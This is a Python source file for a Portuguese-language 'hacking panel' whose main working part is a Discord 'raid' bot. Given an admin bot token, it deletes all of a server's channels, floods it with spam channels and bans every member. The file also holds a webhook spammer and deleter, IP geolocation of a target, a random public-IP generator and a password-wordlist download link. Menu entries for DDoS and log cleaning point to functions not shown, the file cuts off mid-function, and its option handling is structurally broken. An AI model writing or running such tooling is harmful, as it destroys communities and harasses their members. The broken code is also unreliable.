#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading
import webbrowser
from pathlib import Path
import random
import ipaddress
import urllib
import urllib3
import socket
import ssl
from bs4 import BeautifulSoup
import time
import json
import re
from urllib.parse import urljoin, urlparse
import discord
from discord.ext import commands
import asyncio
import sys
import requests
import aiohttp
import itertools
import string
import os
import shutil
import platform
from datetime import datetime, timedelta
import subprocess
import glob


def degrade_roxo(texto, inicio_rgb=None, fim_rgb=None):
    import math

    # Cores padrão do degradê roxo
    if inicio_rgb is None:
        inicio_rgb = (75, 0, 130)  # Roxo escuro
    if fim_rgb is None:
        fim_rgb = (238, 130, 238)  # Violeta

    # Divide o texto em linhas
    linhas = texto.split("\n")

    # Calcula o número total de caracteres (excluindo linhas vazias)
    total_caracteres = sum(len(linha) for linha in linhas if linha.strip())
    if total_caracteres == 0:
        print(texto)
        return

    caracter_atual = 0

    # Aplica o degradê a cada linha
    for linha in linhas:
        if not linha.strip():
            print()
            continue

        linha_colorida = ""
        for char in linha:
            if char.strip():  # Aplica cor apenas a caracteres não vazios
                # Calcula a progressão do degradê
                progressao = caracter_atual / total_caracteres

                # Interpola as cores RGB
                r = int(inicio_rgb[0] + (fim_rgb[0] - inicio_rgb[0]) * progressao)
                g = int(inicio_rgb[1] + (fim_rgb[1] - inicio_rgb[1]) * progressao)
                b = int(inicio_rgb[2] + (fim_rgb[2] - inicio_rgb[2]) * progressao)

                # Código ANSI para cor
                linha_colorida += f"\033[38;2;{r};{g};{b}m{char}"
                caracter_atual += 1
            else:
                linha_colorida += char

        # Reseta a cor no final da linha
        linha_colorida += "\033[0m"
        print(linha_colorida)


def clear_console():
    """Limpa o console de acordo com o sistema operacional"""
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHIT = "\033[37m"
BLACK = "\033[30m"

ROXO_CLA = "\033[95m"
ROXO_MED = "\033[35m"
ROXO_ESCU = "\033[35;1m"
LILAS = "\033[38;5;183m"

BRIGHT_RED = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_YELLOW = "\033[93m"
BRIGHT_BLUE = "\033[94m"
BRIGHT_MAGENTA = "\033[95m"
BRIGHT_CYAN = "\033[96m"

RESET = "\033[0m"

texto = f"""
             ██▀███   ▄▄▄      ▓█████▄  ██▓ ▄▄▄       ███▄    █  ▄████▄  ▓█████ 
            ▓██ ▒ ██▒▒████▄    ▒██▀ ██▌▓██▒▒████▄     ██ ▀█   █ ▒██▀ ▀█  ▓█   ▀ 
            ▓██ ░▄█ ▒▒██  ▀█▄  ░██   █▌▒██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒▓█    ▄ ▒███  
            ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█▄   ▌░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒▓█  ▄ 
            ░██▓ ▒██▒ ▓█   ▓██▒░▒████▓ ░██░ ▓█   ▓██▒▒██░   ▓██░▒ ▓███▀ ░░▒████▒
            ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓   ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░░ ▒░ ░
              ░▒ ░ ▒░  ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░  ▒    ░ ░  ░
              ░░   ░   ░   ▒    ░ ░  ░  ▒ ░  ░   ▒      ░   ░ ░ ░           ░   
               ░           ░  ░   ░     ░        ░  ░         ░ ░ ░         ░  ░              
                            ░                               ░                   \n"""

options = f"""                                    {ROXO_ESCU}All tools -by {RESET}{BLUE}w_ky{RESET}
{ROXO_ESCU}[{RESET}{WHIT}0{ROXO_ESCU}]-Exit ┌───────────────┐                ┌────────────┐            ┌───────────┐   [{RESET}H{WHIT}{RESET}{ROXO_ESCU}]-Help          
┌────────┤ {RESET}{LILAS}discord tools{RESET}{ROXO_ESCU} ├────────┬───────┤ {RESET}{LILAS}hack tools{RESET}{ROXO_ESCU} ├───────┬────┤ {RESET}{LILAS}Utilities{RESET}{ROXO_ESCU} ├───────────
│        └───────────────┘        │       └────────────┘       │    └───────────┘
├─[01]-raid bot (lecuio)          ├─[07]-Vulnerability Scanner ├─[13]-password-list(240k)
├─[02]-webhook tracker            ├─[08]-DDoS                  ├─[14]-Your IP Adrress
├─[03]-                           ├─[09]-LOG cleaner           ├─[15]-IP scanner
├─[04]-                           ├─[10]-                      ├─[16]-IP generator
├─[05]-                           ├─[11]-                      ├─[17]-phone number lockup
└─[06]-                           ├─[12]-                      ├─[18]-phone number generator                                                       
"""


def abrir_chrome_download(url_download):
    try:
        chrome_paths = [
            "C:/Program Files/Google/Chrome/Application/chrome.exe",
            "C:/Program Files (x86)/Google/Chrome/Application/chrome.exe",
            "/usr/bin/google-chrome",
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        ]

        chrome_path = None
        for path in chrome_paths:
            if os.path.exists(path):
                chrome_path = path
                break

        if chrome_path:
            webbrowser.register(
                "chrome", None, webbrowser.BackgroundBrowser(chrome_path)
            )
            webbrowser.get("chrome").open(url_download)
        else:
            webbrowser.open(url_download)
    except:
        pass


def wait_for_key():
    print(f"{YELLOW}[>] Pressione qualquer tecla para voltar ao menu...{RESET}")
    clear_console()
    menu()


def menu():
    clear_console()
    degrade_roxo(texto)
    print(options)
    desejo = input(
        f"""{BLUE}
┌──(w_ky㉿radiance)-[{GREEN}~{RESET}{BLUE}]
└─{RESET}{GREEN}$ {RESET}"""
    )

    if desejo == "1":
        clear_console()
        lecuio()
    elif desejo == "2":
        clear_console()
        webhook_tracker()
        time.sleep(2)
        menu()
    elif desejo == "3":
        clear_console()
        print(f"{YELLOW}em breve...{RESET}")
        time.sleep(2)
        menu()
    elif desejo == "4":
        clear_console()
        print(f"{YELLOW}em breve...{RESET}")
        time.sleep(2)
        menu()
    elif desejo == "5":
        clear_console()
        print(f"{YELLOW}em breve...{RESET}")
        time.sleep(2)
        menu()
    elif desejo == "6":
        clear_console()
        print(f"{YELLOW}em breve...{RESET}")
        time.sleep(2)
        menu()
    elif desejo == "7":
        clear_console()
        scan_vulnerabilities()
    elif desejo == "8":
        clear_console()
        DDoS()
        time.sleep(2)
        menu()
    elif desejo == "9":
        log_cleaner()
        time.sleep(2)
        menu()
    elif desejo == "10":
        clear_console()
        print(f"{YELLOW}em breve...{RESET}")
        time.sleep(2)
        menu()
    elif desejo == "11":
        clear_console()
        print(f"{YELLOW}em breve...{RESET}")
        time.sleep(2)
        menu()
    elif desejo == "12":
        clear_console()
        print(f"{YELLOW}em breve...{RESET}")
        time.sleep(2)
        menu()
    elif desejo == "13":
        clear_console()
        abrir_chrome_download(
            "https://www.mediafire.com/file/tg866brszphbum7/password-wordlist.txt/file"
        )
        menu()
    elif desejo == "14":
        clear_console()
        My_ip()
        clear_console()
        time.sleep(2)
        menu()
    elif desejo == "15":
        clear_console()
        ip_scanner()
        time.sleep(2)
        menu()
    elif desejo == "16":
        clear_console()
        ip_generator()
        time.sleep(2)
        menu()
    elif desejo == "17":
        clear_console()
        phone_lockup()
        time.sleep(2)
        menu()
    elif desejo == "18":
        clear_console()
        phone_generator()

    elif desejo.lower() == "h":
        clear_console()
        linguagem = input(
            f"[{RED}01{RESET}]-português\n[{RED}02{RESET}]-english\n\nEscolha a linguagem: "
        )
        if linguagem == "1":
            clear_console()
            print(
                f"""{MAGENTA}o programa é um painel focado em ferramentas de discord e hacking, desenvolvido por w_ky.\n caso tenha interesse em contribuir com o projeto, entre em contato comigo pelo discord: {GREEN}nicknha007{RESET}"""
            )
            voltar = input(f"\n{CYAN}pressione enter para retornar ao menu: {RESET}")
            if voltar == "":
                clear_console()
                menu()
            else:
                clear_console()
                menu()
        elif linguagem == "2":
            clear_console()
            print(
                f"""{MAGENTA}the program is a panel focused on discord and hacking tools, developed by w_ky.\n if you are interested in contributing to the project, contact me on discord: {WHIT}nicknha007{RESET}\n"""
            )
            voltar = input(f"\n{CYAN}press enter to return to the menu: {RESET}")
            if voltar == "":
                clear_console()
                menu()
            else:
                clear_console()
                menu()
    elif desejo == "0":
        clear_console()
        exit()
    else:
        print(f"{RED}ERRO!{RESET}")
        time.sleep(1.5)
        clear_console()
        menu()


def lecuio():
    def clear_screen():
        os.system("cls" if platform.system() == "Windows" else "clear")

    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    RESET = "\033[0m"

    clear_screen()
    TOKEN = input(f"({RED}LECUIO{RESET})Token do seu bot: ")
    time.sleep(1)
    clear_screen()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    bot = commands.Bot(command_prefix="!", intents=intents)

    async def get_admin_guilds():
        return [
            guild for guild in bot.guilds if guild.me.guild_permissions.administrator
        ]

    async def selection():
        admin_guilds = await get_admin_guilds()
        if not admin_guilds:
            print(f"{RED}O bot não é admin em nenhum servidor!{RESET}")
            await bot.close()
            return None

        clear_screen()
        print(
            f"""{MAGENTA}
                                
██╗     ███████╗ ██████╗██╗   ██╗ ██╗  ██████╗ 
██║     ██╔════╝██╔════╝██║   ██ ║██ ║██╔═══██╗
██║     █████╗  ██║     ██║   ██ ║██ ║██║   ██║
██║     ██╔══╝  ██║     ██║   ██ ║██ ║██║   ██║
███████╗███████╗╚██████╗╚██████╔╝ ██║ ╚██████╔╝
╚══════╝╚══════╝ ╚═════╝ ╚═════╝  ╚═╝ ╚═════╝ {RESET}
    
        {MAGENTA}SERVIDORES DISPONÍVEIS:{RESET}\n"""
        )
        for i, guild in enumerate(admin_guilds, 1):
            print(
                f"{RED}{i}]{RESET} {BLUE}{guild.name} 👥 {guild.member_count} membros)"
            )

        while True:
            try:
                choice = input(
                    f"\n{RED}»{RESET} Selecione um servidor (1-{len(admin_guilds)}): "
                )
                selected_guild = admin_guilds[int(choice) - 1]
                clear_screen()
                print(
                    f"\n{YELLOW}Servidor selecionado: {RED}{selected_guild.name}{RESET}"
                )
                return selected_guild
            except (ValueError, IndexError):
                print(f"{RED}Opção inválida! Tente novamente.{RESET}")
            except KeyboardInterrupt:
                await bot.close()
                sys.exit(0)

    async def handle_option(guild, option):
        global criar_e_spammar
        try:
            if option == "1":
                confirm = input(f"{RED}VAI APAGAR TUDO MESMO? (s/n): {RESET}")
                if confirm.lower() == "s":
                    await asyncio.gather(
                        *[channel.delete() for channel in guild.channels],
                        return_exceptions=True,
                    )
                    await asyncio.gather(
                        *[channel.delete() for channel in guild.channels],
                        return_exceptions=True,
                    )
                    await asyncio.gather(
                        *[channel.delete() for channel in guild.channels],
                        return_exceptions=True,
                    )
                    await asyncio.gather(
                        *[channel.delete() for channel in guild.channels],
                        return_exceptions=True,
                    )
                    await asyncio.gather(
                        *[channel.delete() for channel in guild.channels],
                        return_exceptions=True,
                    )
                    await asyncio.gather(
                        *[channel.delete() for channel in guild.channels],
                        return_exceptions=True,
                    )
                    # tenta mais 6 vezes pra garantir que vai apagar tudo kkkkkkkk
                    print(f"{GREEN}TODOS OS CANAIS DELETADOS!{RESET}")

                    time.sleep(3)
                    input(f"\n{BLUE}ENTER PRA CONTINUAR...{RESET}")
                    return guild, True

            elif option == "2":
                quantia = int(input(f"{BLUE}QUANTOS CANAIS?: {RESET}"))
                nome = input(f"{BLUE}NOME DOS CANAIS: {RESET}")
                msg = input(f"{BLUE}MENSAGEM PRA SPAMMAR: {RESET}")
                clear_screen()

                async def criar_e_spammar():
                    channel = await guild.create_text_channel(nome)
                    await channel.send(msg)
                    print(f"{GREEN}»{RESET} {YELLOW}{channel.name}{RESET} CRIADO E SPAMMADO! {i + 1}")  # type: ignore

                await asyncio.gather(
                    *[criar_e_spammar() for _ in range(quantia)], return_exceptions=True
                )
                time.sleep(3)
                new_guild = await selection()
                if new_guild:
                    return new_guild, True

            # pra quando retonar um erro de canal ele tentar criar um canal dnv
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.gather(
                    *[criar_e_spammar() for _ in range(1)], return_exceptions=True
                )

            elif option == "3":
                quantia = int(input(f"{BLUE}QUANTOS CANAIS?: {RESET}"))
                nome = input(f"{BLUE}NOME DOS CANAIS: {RESET}")
                msg = input(f"{BLUE}MENSAGEM PRA SPAMMAR: {RESET}")
                clear_screen()

                await asyncio.gather(
                    *[channel.delete() for channel in guild.channels],
                    return_exceptions=True,
                )

                async def criar_e_spammar():
                    channel = await guild.create_text_channel(nome)
                    await channel.send(msg)
                    print(f"{GREEN}»{RESET} {YELLOW}{channel.name}{RESET} CRIADO E SPAMMADO! {i + 1}")  # type: ignore

                await asyncio.gather(
                    *[criar_e_spammar() for _ in range(quantia)], return_exceptions=True
                )

        except discord.HTTPException as e:
            if e.status == 429:

                async def criar_e_spammar2():
                    channel = await guild.create_text_channel(nome)
                    await channel.send(msg)

                await asyncio.gather(
                    *[criar_e_spammar2() for _ in range(1)], return_exceptions=True
                )

            elif option == "4":
                new_name = input(f"{BLUE}NOVO NOME DO SERVIDOR: {RESET}")
                await guild.edit(name=new_name)
                print(f"{GREEN}NOME ALTERADO PARA: {CYAN}{new_name}{RESET}")

            elif option == "5":
                confirm = input(f"{RED}BANIR TODO MUNDO? (s/n): {RESET}")
                if confirm.lower() == "s":
                    razao = input("razao dos banimentos gerais: ")
                    async for member in guild.fetch_members():
                        if member != guild.me:
                            try:
                                await member.ban(reason=f"{razao}")
                                await asyncio.sleep(0.35)
                                print(f"{RED}»{RESET} {member.name} BANIDO!")
                            except:
                                print(f"{RED}»{RESET} FALHA AO BANIR {member.name}")

            elif option == "0":
                print(f"{GREEN}SAINDO...{RESET}")
                time.sleep(2)
                return False

            elif option == "6":
                new_guild = await selection()
                if new_guild:
                    return new_guild, True

            input(f"\n{BLUE}ENTER PRA CONTINUAR...{RESET}")
            return guild, True

        except Exception as e:
            print(f"{RED}ERRO: {e}{RESET}")
            input(f"\n{BLUE}ENTER PRA CONTINUAR...{RESET}")
            return guild, True

    @bot.event
    async def on_ready():
        selected_guild = await selection()
        if not selected_guild:
            return

        while True:
            try:
                show_menu(selected_guild)
                option = input(f"\n{RED}»{RESET} OPÇÃO: ")

                result = await handle_option(selected_guild, option)
                if isinstance(result, tuple):
                    selected_guild, continue_loop = result
                    if not continue_loop:
                        break
                else:
                    if not result:
                        break

            except KeyboardInterrupt:
                print(f"\n{YELLOW}ENCERRANDO...{RESET}")
                await bot.close()
                break
            except Exception as e:
                print(f"\n{RED}ERRO: {e}{RESET}")
                time.sleep(2)
                clear_screen()
                await asyncio.sleep(1)

    def show_menu(selected_guild):
        clear_screen()
        print(
            f"""
\n{YELLOW}Servidor selecionado: {RED}{selected_guild.name}{RESET}

{RED}[1]{RESET} Limpar todos os canais (TURBO)
{RED}[2]{RESET} Criar múltiplos canais (MAX: 500)
{RED}[3]{RESET} Nuke completo
{RED}[4]{RESET} Mudar nome do servidor
{RED}[5]{RESET} Banir todos os membros (R.I.P.)
{RED}[6]{RESET} Mudar de server
{RED}[0]{RESET} Sair
"""
        )

    if __name__ == "__main__":
        try:
            bot.run(TOKEN)
        except discord.LoginFailure:
            print(f"{RED}TOKEN INVÁLIDO!{RESET}")
        except Exception as e:
            print(f"{RED}ERRO CRÍTICO: {e}{RESET}")


def ip_scanner():
    try:
        target_ip = input("\n🔍 Digite o IP: ").strip()

        if not target_ip:
            print("❌ IP não pode ser vazio!")
            return

        print(f"\n📡 Escaneando IP: {target_ip}...")

        api_url = f"http://ip-api.com/json/{target_ip}"
        response = requests.get(api_url, timeout=10)
    except requests.exceptions.Timeout:
        print("❌ Timeout - Verifique sua conexão com a internet")
        input(f"\n⏎ Pressione Enter para voltar ao menu...")
        return
    except requests.exceptions.ConnectionError:
        print("❌ Erro de conexão - Verifique sua internet")
        input(f"\n⏎ Pressione Enter para voltar ao menu...")
        return
    except Exception as e:
        print(f"❌ Erro inesperado: {e}")
        input(f"\n⏎ Pressione Enter para voltar ao menu...")
        return

    # Process response
    if response.status_code == 200:
        data = response.json()

        if data.get("status") == "success":
            # Pegando informações
            country = data.get("country", "N/A")
            city = data.get("city", "N/A")
            region = data.get("regionName", "N/A")
            zip_code = data.get("zip", "N/A")
            timezone = data.get("timezone", "N/A")
            isp = data.get("isp", "N/A")
            org = data.get("org", "N/A")
            lat = data.get("lat", "N/A")
            lon = data.get("lon", "N/A")

            # Horário local baseado no timezone
            local_time = "N/A"
            if timezone and timezone != "N/A":
                try:
                    from datetime import datetime

                    # Prefer the stdlib zoneinfo (Python 3.9+), fallback to pytz if available
                    try:
                        from zoneinfo import ZoneInfo

                        tz = ZoneInfo(timezone)
                        local_time = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
                    except Exception:
                        try:
                            import pytz  # type: ignore

                            tz = pytz.timezone(timezone)
                            local_time = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
                        except Exception:
                            local_time = "Fuso horário não disponível (instale 'pytz' ou use Python>=3.9)"
                except Exception:
                    local_time = "Fuso horário não disponível"

            ip_banner = f"""{BRIGHT_RED}
█████ ███████████      █████████                                                             
░░███ ░░███░░░░░███    ███░░░░░███                                                            
 ░███  ░███    ░███   ░███    ░░░   ██████   ██████   ████████   ████████    ██████  ████████ 
 ░███  ░██████████    ░░█████████  ███░░███ ░░░░░███ ░░███░░███ ░░███░░███  ███░░███░░███░░███
 ░███  ░███░░░░░░      ░░░░░░░░███░███ ░░░   ███████  ░███ ░███  ░███ ░███ ░███████  ░███ ░░░ 
 ░███  ░███            ███    ░███░███  ███ ███░░███  ░███ ░███  ░███ ░███ ░███░░░   ░███     
 █████ █████          ░░█████████ ░░██████ ░░████████ ████ █████ ████ █████░░██████  █████    
░░░░░ ░░░░░            ░░░░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░                                                                                              
\n{RESET}"""
            clear_console()
            print(ip_banner)
            print(f"📍  IP: {target_ip}\n")
            print(f"🌎 País: {country}\n")
            print(f"🏙️  Cidade: {city}\n")
            print(f"🗺️ Região: {region}\n")
            print(f"📮  CEP: {zip_code}\n")
            print(f"⏰ Timezone: {timezone}\n")
            print(f"🕒 Horário Local: {local_time}\n")
            print(f"📡 ISP: {isp}\n")
            print(f"🏢 Organização: {org}\n")
            print(f"📌 Coordenadas: {lat}, {lon}\n")

            # Informações adicionais de rede
            try:
                hostname = socket.gethostbyaddr(target_ip)[0]
                print(f"🖥️ Hostname: {hostname}")
            except Exception:
                print("🖥️ Hostname: Não encontrado")

            # Verifica se é IP reservado/local
            if target_ip.startswith(("10.", "172.", "192.168.", "127.")):
                print("🔒 IP: Rede Local/Privada")
            elif target_ip == "255.255.255.255":
                print("🔒 IP: Broadcast")
            else:
                print("🌐 IP: Público")

        else:
            print(f"❌ Erro na consulta: {data.get('message', 'Erro desconhecido')}")
    else:
        print("❌ Erro ao conectar com a API de geolocalização")

    a = input(f"\n⏎ Pressione Enter para voltar ao menu...")
    if a == "":
        clear_console
        menu()
    else:
        clear_console
        menu()

    import subprocess, sys

    for pkg in ["discord.py", "aiohttp"]:
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pkg],
                capture_output=True,
                check=True,
            )
        except:
            pass


def My_ip():
    print("\n📡 Detectando seu IP e informações...")
    time.sleep(2)
    My_ip_banner = f"""{BRIGHT_YELLOW}
██████   ██████               █████ ███████████ 
░░██████ ██████               ░░███ ░░███░░░░░███
 ░███░█████░███  █████ ████    ░███  ░███    ░███
 ░███░░███ ░███ ░░███ ░███     ░███  ░██████████ 
 ░███ ░░░  ░███  ░███ ░███     ░███  ░███░░░░░░  
 ░███      ░███  ░███ ░███     ░███  ░███        
 █████     █████ ░░███████     █████ █████       
░░░░░     ░░░░░   ░░░░░███    ░░░░░ ░░░░░        
                  ███ ░███                       
                 ░░██████                        
                  ░░░░░░                         
    {RESET}"""
    ip_response = requests.get("https://api.ipify.org?format=json", timeout=10)

    if ip_response.status_code == 200:
        my_ip = ip_response.json().get("ip")

        if my_ip:
            clear_console()
            print(f"{My_ip_banner}\n")
            print(f"IP detectado: {RED}{my_ip}{RESET}\n")
            b = input(f"\n⏎ Pressione Enter para voltar ao menu...")
            if b == "":
                clear_console()
                menu()
            else:
                clear_console()
                menu()


def webhook_tracker():

    def test_webhook(webhook_url):
        try:
            response = requests.get(webhook_url, timeout=10)
            return response.status_code == 200
        except:
            return False

    def send_message(webhook_url):
        print(f"\n📝 ENVIAR MENSAGEM\n")

        message = input("Digite a mensagem: ").strip()
        if not message:
            print("❌ Mensagem não pode ser vazia!")
            return

        username = input("Nome do bot (opcional): ").strip()
        avatar_url = input("URL do avatar (opcional): ").strip()

        payload = {
            "content": message,
            "username": username if username else None,
            "avatar_url": avatar_url if avatar_url else None,
        }

        # Remove campos vazios
        payload = {k: v for k, v in payload.items() if v is not None}

        try:
            response = requests.post(webhook_url, json=payload, timeout=10)

            if response.status_code == 204:
                print("✅ Mensagem enviada com sucesso!")
            else:
                print(f"❌ Erro ao enviar: {response.status_code}")

        except Exception as e:
            print(f"❌ Erro: {e}")

    def rename_webhook(webhook_url):
        print(f"\n🔄 RENOMEAR WEBHOOK")
        print(f"{'-'*30}")

        new_name = input("Novo nome: ").strip()
        if not new_name:
            print("❌ Nome não pode ser vazio!")
            return

        payload = {"name": new_name}

        try:
            response = requests.patch(webhook_url, json=payload, timeout=10)

            if response.status_code == 200:
                print("✅ Webhook renomeado com sucesso!")
            else:
                print(f"❌ Erro ao renomear: {response.status_code}")

        except Exception as e:
            print(f"❌ Erro: {e}")

    def delete_webhook(webhook_url):
        """Deleta o webhook"""
        print(f"\n🗑️  DELETAR WEBHOOK")
        print(f"{'-'*30}")

        confirm = input("❌ TEM CERTEZA? (s/n): ").strip().lower()
        if confirm == "s":
            try:
                response = requests.delete(webhook_url, timeout=10)

                if response.status_code == 204:
                    print("✅ Webhook deletado com sucesso!")
                    return True  # Retorna True pra indicar que foi deletado
                else:
                    print(f"❌ Erro ao deletar: {response.status_code}")

            except Exception as e:
                print(f"❌ Erro: {e}")
        else:
            print("✅ Ação cancelada")

        return False

    def get_webhook_info(webhook_url):
        """Pega informações do webhook"""
        try:
            response = requests.get(webhook_url, timeout=10)

            if response.status_code == 200:
                data = response.json()
                print(f"\n📊 INFORMAÇÕES DO WEBHOOK:")
                print(f"{'-'*30}")
                print(f"🔹 Nome: {data.get('name', 'N/A')}")
                print(f"🔹 Canal ID: {data.get('channel_id', 'N/A')}")
                print(f"🔹 Servidor: {data.get('guild_id', 'N/A')}")
                print(f"🔹 Criador: {data.get('user', {}).get('username', 'N/A')}")
                print(f"🔹 Token: {data.get('token', 'N/A')[:10]}...")
                print(f"🔹 URL: {webhook_url[:50]}...\n")
            else:
                print("❌ Não foi possível obter informações")

        except Exception as e:
            print(f"❌ Erro ao obter informações: {e}")

    def send_embed(webhook_url):
        """Envia mensagem com embed"""
        print(f"\n🎨 ENVIAR EMBED")
        print(f"{'-'*30}")

        title = input("Título do embed: ").strip()
        description = input("Descrição: ").strip()
        color = input("Cor (hex, ex: #ff0000): ").strip() or "#ff0000"

        # Converte cor hex para decimal
        try:
            color_decimal = int(color.lstrip("#"), 16)
        except:
            color_decimal = 16711680  # Vermelho padrão

        embed = {"title": title, "description": description, "color": color_decimal}

        # Campos opcionais
        footer = input("Rodapé (opcional): ").strip()
        if footer:
            embed["footer"] = {"text": footer}

        thumbnail = input("URL thumbnail (opcional): ").strip()
        if thumbnail:
            embed["thumbnail"] = {"url": thumbnail}

        image = input("URL imagem (opcional): ").strip()
        if image:
            embed["image"] = {"url": image}

        payload = {"embeds": [embed]}

        try:
            response = requests.post(webhook_url, json=payload, timeout=10)

            if response.status_code == 204:
                print("✅ Embed enviado com sucesso!")
            else:
                print(f"❌ Erro ao enviar embed: {response.status_code}")

        except Exception as e:
            print(f"❌ Erro: {e}")

    def spam_messages(webhook_url):
        """Envia múltiplas mensagens"""
        print(f"\n🚀 SPAM DE MENSAGENS")
        print(f"{'-'*30}")

        try:
            message = input("Mensagem: ").strip()
            count = int(input("Quantidade: ").strip())
            delay = float(input("Delay entre mensagens (segundos): ").strip())

            print(f"\n📤 Enviando {count} mensagens...")

            for i in range(count):
                payload = {"content": f"{message} [{i+1}/{count}]"}

                response = requests.post(webhook_url, json=payload, timeout=10)

                if response.status_code == 204:
                    print(f"✅ Mensagem {i+1}/{count} enviada")
                else:
                    print(f"❌ Erro na mensagem {i+1}")

                time.sleep(delay)

        except ValueError:
            print("❌ Número inválido!")
        except Exception as e:
            print(f"❌ Erro: {e}")

    clear_console()
    print("não vai ter arte ascii pq eu to com preguiça kkkkkkkk\n")
    webhook_url = input("\n🔗 URL do Webhook: ").strip()

    if not webhook_url:
        print("❌ URL não pode ser vazia!")
        input("\n⏎ Pressione Enter para voltar...")
        return

    print("\n🔍 Testando webhook...")
    if not test_webhook(webhook_url):
        print("❌ Webhook inválido ou inacessível!")
        input("\n⏎ Pressione Enter para voltar...")
        return

    print("✅ Webhook válido!")

    get_webhook_info(webhook_url)

    while True:
        print("1] 📝 Enviar Mensagem")
        print("2] 🎨 Enviar Embed")
        print("3] 🚀 Spam de Mensagens")
        print("4] 🔄 Renomear Webhook")
        print("5] 📊 Ver Informações")
        print("6] 🗑️  Deletar Webhook")
        print("0] ↩️  Voltar ao Menu")

        choice = input("\n🔍oque deseja?: ").strip()

        if choice == "1":
            clear_console()
            send_message(webhook_url)
        elif choice == "2":
            clear_console()
            send_embed(webhook_url)
        elif choice == "3":
            clear_console()
            spam_messages(webhook_url)
        elif choice == "4":
            clear_console()
            rename_webhook(webhook_url)
        elif choice == "5":
            clear_console()
            get_webhook_info(webhook_url)
        elif choice == "6":
            clear_console()
            if delete_webhook(webhook_url):
                input("\n⏎ Pressione Enter para voltar...")
                break
        elif choice == "0":
            print("\n✅ Voltando ao menu principal...")
            break
        else:
            print("❌ Opção inválida!")

        input("\n⏎ Pressione Enter para continuar...")
        clear_console()
        get_webhook_info(webhook_url)


def ip_generator():

    banner_ip_generator = f"""{BRIGHT_CYAN}
╦┌─┐  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐
║├─┘  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘
╩┴    └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─                                                                                                
"""
    EXCLUIDOS = [
        ipaddress.IPv4Network("0.0.0.0/8"),
        ipaddress.IPv4Network("10.0.0.0/8"),
        ipaddress.IPv4Network("100.64.0.0/10"),
        ipaddress.IPv4Network("127.0.0.0/8"),
        ipaddress.IPv4Network("169.254.0.0/16"),
        ipaddress.IPv4Network("172.16.0.0/12"),
        ipaddress.IPv4Network("192.0.0.0/24"),
        ipaddress.IPv4Network("192.0.2.0/24"),
        ipaddress.IPv4Network("192.88.99.0/24"),
        ipaddress.IPv4Network("192.168.0.0/16"),
        ipaddress.IPv4Network("198.18.0.0/15"),
        ipaddress.IPv4Network("198.51.100.0/24"),
        ipaddress.IPv4Network("203.0.113.0/24"),
        ipaddress.IPv4Network("224.0.0.0/4"),
        ipaddress.IPv4Network("240.0.0.0/4"),
    ]

    def ip_publico_aleatorio():
        """Retorna um IPv4 público aleatório."""
        while True:
            ip = ipaddress.IPv4Address(random.randint(0, (1 << 32) - 1))
            if not any(ip in rede for rede in EXCLUIDOS):
                return str(ip)

    def gerar(qtd):
        """Gera qtd IPs e imprime na tela."""
        ips = [ip_publico_aleatorio() for _ in range(qtd)]
        for ip in ips:
            print(ip)
        c = input("\n⏎ Precione Enter para voltar...")
        if c == "":
            clear_console()
            menu()
        else:
            clear_console()
            menu()

    # Interface simples para gerar IPs
    while True:
        try:
            clear_console()
            print(f"{banner_ip_generator}")
            qtd_str = input("\nQuantidade de IPs para gerar (0 para voltar): ").strip()
            if not qtd_str:
                continue
            qtd = int(qtd_str)
            if qtd <= 0:
                break
            gerar(qtd)
        except ValueError:
            print("❌ Número inválido!")
        except KeyboardInterrupt:
            break


def phone_lockup():
    banner_phone_lookup = f"""{BRIGHT_MAGENTA}
██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗    ██╗      ██████╗  ██████╗██╗  ██╗██╗   ██╗██████╗ 
██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝    ██║     ██╔═══██╗██╔════╝██║ ██╔╝██║   ██║██╔══██╗
██████╔╝███████║██║   ██║██╔██╗ ██║█████╗      ██║     ██║   ██║██║     █████╔╝ ██║   ██║██████╔╝
██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝      ██║     ██║   ██║██║     ██╔═██╗ ██║   ██║██╔═══╝ 
██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗    ███████╗╚██████╔╝╚██████╗██║  ██╗╚██████╔╝██║     
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                                                                                                  
"""

    def phone_lookup():
        print(f"\n{BRIGHT_CYAN}[*] Iniciando OSINT para número telefônico...{RESET}")

    clear_console()
    print(f"{banner_phone_lookup}\n")
    print(f"{YELLOW}[?]Exemplos de formato aceito:{RESET}")
    print(f"{CYAN}[+55 10 xxxxx-xxxx{RESET}]")

    numero = input(f"\n{YELLOW}[?] Digite o número: {RESET}").strip()

    # Limpa o número - remove tudo que não é dígito, exceto o +
